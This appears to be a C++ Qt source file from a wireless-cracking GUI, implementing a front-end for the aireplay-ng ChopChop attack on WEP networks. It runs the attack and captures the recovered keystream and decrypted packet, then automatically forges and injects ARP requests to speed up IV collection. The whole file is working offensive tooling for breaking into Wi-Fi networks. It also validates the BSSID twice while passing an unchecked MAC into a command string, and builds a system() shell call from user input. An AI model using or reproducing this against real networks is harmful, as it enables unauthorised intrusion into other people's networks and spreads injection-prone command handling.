#include "chopchop.h"
#include "ui_chopchop.h"


chopChop::chopChop(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::chopChop)
{
    debug::add("Constructor of aireplay -4 [chopChop] object " + QString::number(this->winId()));

    ui->setupUi(this);
    connect(this->ui->pushButtonStop, SIGNAL(clicked()), this, SLOT(stop()));
    connect(this->ui->pushButtonLog, SIGNAL(clicked()), this, SLOT(clearLog()));

    process.setProcessChannelMode(QProcess::MergedChannels);
    connect(&process, SIGNAL(readyRead()), this, SLOT(update()));
    this->ui->progressBar->setValue(0);

    this->arpReplay = NULL;

    this->setStatus(STOPPED);
}

chopChop::~chopChop()
{
    debug::add("Destructor of aireplay -4 [chopChop] object " + QString::number(this->winId()));

    delete ui;
    if (arpReplay)
        delete arpReplay;
}

void chopChop::resetValues(){
    this->ui->spinBoxReading->setValue(0);
    this->ui->lineEditSent->clear();
    this->ui->progressBar->setValue(0);
}

void chopChop::clearLog(){
    utils::customClearLog(this->ui->textEdit, "ChopChop Attack Log");
}

void chopChop::toThisLog(QString com){
    this->ui->textEdit->append(com);
}

void chopChop::setStatus(STATUS s){
    {status = s;}
    switch (s) {
    case STOPPED:
        this->ui->lineEditStatus->setText("STOPPED");
        utils::setBackgroundColor(this->ui->lineEditStatus, utils::RED);
        //progressBar to 0%
        this->ui->progressBar->setValue(0);
        break;
    case ATTACKING:
        this->ui->lineEditStatus->setText("ATTACKING...");
        utils::setBackgroundColor(this->ui->lineEditStatus, utils::YELLOW);
        break;
    case OBTAINED:
        utils::setBackgroundColor(this->ui->lineEditStatus, utils::GREEN);
        this->ui->lineEditStatus->setText("OBTAINED");
        //progressBar to 100%
        this->ui->progressBar->setValue(100);
        break;
    }

}

void chopChop::injectPaquet(){

    //If previuos arp is open, we delete
    if (arpReplay)
        delete arpReplay;

    //inserting window arp replay
    arpReplay = new aireplayArpReplay();
    //connect to log
    connect(this->arpReplay, SIGNAL(toLog(QString)), this, SLOT(toThisLog(QString)));
    this->ui->tabWidget->addTab(arpReplay, "Step 2: Inject ARP Forged");
    this->ui->tabWidget->setCurrentWidget(arpReplay);
    arpReplay->showMaximized();



    QString arpForged;
    const QString IP_DEST = utils::findIpDest(lastDecryptedCap);

    //We have a decrypted packet so we CAN find ipdest
    //************************************************************************
    //by this method, we obtain 3 IV per each ARP Paquet reinjected!!!!!!!!!!!!!!!!!!!!!!!
    //************************************************************************
    if (!IP_DEST.isEmpty()) {
        //special arp forged, we could receive 3 ivs per each arp injected
        arpForged = utils::forgeARP(lastXor, lastBSSID, lastMAC, "10.255.255.255", IP_DEST);
        toThisLog("*****************************************************************************");
        toThisLog(utils::htmlVerde("DECRYPTED AN IP_DEST! INJECTION RATE MULTIPLIED X 3!!!!!!!"));
        toThisLog("*****************************************************************************");
        //sent to log arp-replay
        arpReplay->toThisLog("*****************************************************************************");
        arpReplay->toThisLog(utils::htmlVerde("DECRYPTED AN IP_DEST! INJECTION RATE MULTIPLIED X 3!!!!!!!"));
        arpReplay->toThisLog("*****************************************************************************");
    }

    else
        //normal arp forged
        arpForged = utils::forgeARP(lastXor, lastBSSID, lastMAC, "255.255.255.255", "255.255.255.255");

    if (arpForged.isEmpty()) {
           toThisLog(utils::htmlRojo("arpForged Error File"));
           return;
    }


    toThisLog(utils::htmlVerde(QString("arpForged and stored in " + arpForged)));

    //start injecting
    arpReplay->start(lastBSSID, lastMAC, arpForged);
    toThisLog(utils::htmlVerde("INJECTING!!"));
    emit succesfull("CHOPCHOP ATTACK SUCCESFULL! RE-INYECTING!");


}

void chopChop::start(QString BSSID, QString MAC){
    if (!utils::validMAC(BSSID)){
        utils::mostrarError("Invalid BSSID");
        return;
    }

    //if (MAC == "NO_MAC")
    //    MAC = "";

    //else
    if (!MAC.isEmpty()) {

        //storing BSSID & MAC
        this->lastBSSID = BSSID;
        this->lastMAC = MAC;

        if (!utils::validMAC(BSSID)){
            utils::mostrarError("Invalid MAC");
            return;
        }

        else
            MAC = " -h " + MAC; //add flag to mac
    }



    //checking if the folder BSSID exists. If not, we create it to store there caps
    if (!QFile::exists(CHOP_FOLDER + BSSID))
        system( QString("mkdir " + CHOP_FOLDER + BSSID).toLatin1().data() );

    //set working directory
    process.setWorkingDirectory(CHOP_FOLDER + BSSID);

    const QString command = "../../" + AIREPLAY_COM +
            " -4 " +
            " -m " + QString::number(GLOBALS::CHOP_MIN_PACKET) +
            " -n " + QString::number(GLOBALS::CHOP_MAX_PACKET) +
            " -b " + BSSID +
            MAC +
            " " + GLOBALS::INTERFACE;

    //if process is already running, we have to stop it
    stop();

    process.start(command);
    debug::add("Starting aireplay -4 [chopChop] process " + QString::number(process.pid()));

    emit toLog(command);

    if (!process.waitForStarted(WAIT_FOR_PROCESS)){
        utils::mostrarError("Error al intentar ejecutar " + command);
        return;
    }

    toThisLog("Reading packets to do Chop Attack...");
    toThisLog("If reading take a long time, you can try to increase the maximum packet filter in options");
    this->setStatus(ATTACKING);
    //reset values
    this->resetValues();


}




void chopChop::stop(){
    if (process.state() == QProcess::Running) {
        debug::add("Stopping aireplay -4 [chopChop] process " + QString::number(process.pid()));

        utils::killProcess(process.pid());
        if (!process.waitForFinished(WAIT_FOR_PROCESS))
            utils::mostrarError("Imposible to terminate attack chopChop process");
        toThisLog("Process stopped");
    }
    //stopping arpreplay step 2 also
    if (arpReplay)
        if (arpReplay->getStatus() != aireplayArpReplay::STOPPED)
            arpReplay->stop();

    this->setStatus(STOPPED);
}

void chopChop::update(){
    static QString info;
    static int index;
    static QString number;


    do {
        info = process.readLine(); //read line to line
        info.remove("\n");
        info.remove("\r");

        if (!info.isEmpty()) {
            //Reading packets
            if (info.contains("Read"))
                this->ui->spinBoxReading->setValue(utils::dropNumber(info));

            /*
            //Failure: the access point does not properly discard frames with an
            //invalid ICV - try running aireplay-ng in non-authenticated mode instead
            else if (info.contains("Failure: the access point")){
                toThisLog(utils::htmlRojo(info));
                toThisLog(utils::htmlVerde("Trying to do the attack in non-authenticated mode instead"));
                this->start(lastBSSID, "NO_MAC");
                return;
            }
            */

            //Sent packets
            else if (info.contains("Sent"))
                //only to lineEdit
                this->ui->lineEditSent->setText(info);

            //arrive a packet
            else if (info.contains("Size: ")) {
                toThisLog(utils::htmlVerde("We found a packet!!!"));
                toThisLog(info);
            }

            //Errors. Is necessary to change the status to stopped
            else if (info.contains("Failure:") || info.contains("failed")) {
                this->toThisLog(utils::htmlRojo(info));
                this->setStatus(STOPPED);
            }

            //Normal errors
            else if (info.contains("deauthentication") || info.contains("FAILED") ||
                     info.contains("invalid"))
                toThisLog(utils::htmlRojo(info));

            //Normal succesfull in getting X offset
            else if (info.contains("frames written")) {
                toThisLog(utils::htmlVerde(info));
                //update progressBar
                index = info.indexOf('(') + 1;
                number.clear();
                while (index < info.size() && info.at(index) != '%')
                    number += info.at(index++);
                this->ui->progressBar->setValue(number.toInt());
            }


            //Saving decrypted packet (we can look it to found IP's of clients)
            else if (info.contains("Saving plaintext")){
                toThisLog(utils::htmlVerde(info));
                //getting decrypted cap file
                lastDecryptedCap = CHOP_FOLDER + lastBSSID + "/" + info.split(' ').at(3);
                //absolute path
                lastDecryptedCap = QFileInfo(lastDecryptedCap).absoluteFilePath();

            }

            //Saving keystream
            else if (info.contains("Saving keystream")){
                toThisLog(utils::htmlVerde(info));
                //getting xor file
                lastXor = CHOP_FOLDER + lastBSSID + "/" + info.split(' ').at(3);
                //absolute path
                lastXor = QFileInfo(lastXor).absoluteFilePath();
            }

            //ChopChop Completed succesfully
            else if (info.contains("Completed")){
                toThisLog(utils::htmlVerde(info));
                toThisLog(utils::htmlVerde("Building and preparing arp request to be injected..."));
                this->setStatus(OBTAINED);
                //LAUNCH INJECT!
                QTimer::singleShot(1000, this, SLOT(injectPaquet()));
            }

            else
                toThisLog(info);


        }


    } while (!info.isEmpty());


    //FORCE UPDATE. IF WE DONT FORCE, I DONT KNOW WHY THE ATTACK COULD BE PARALIZED
    if (this->getStatus() == ATTACKING)
        QTimer::singleShot(1000, this, SLOT(update()));
}
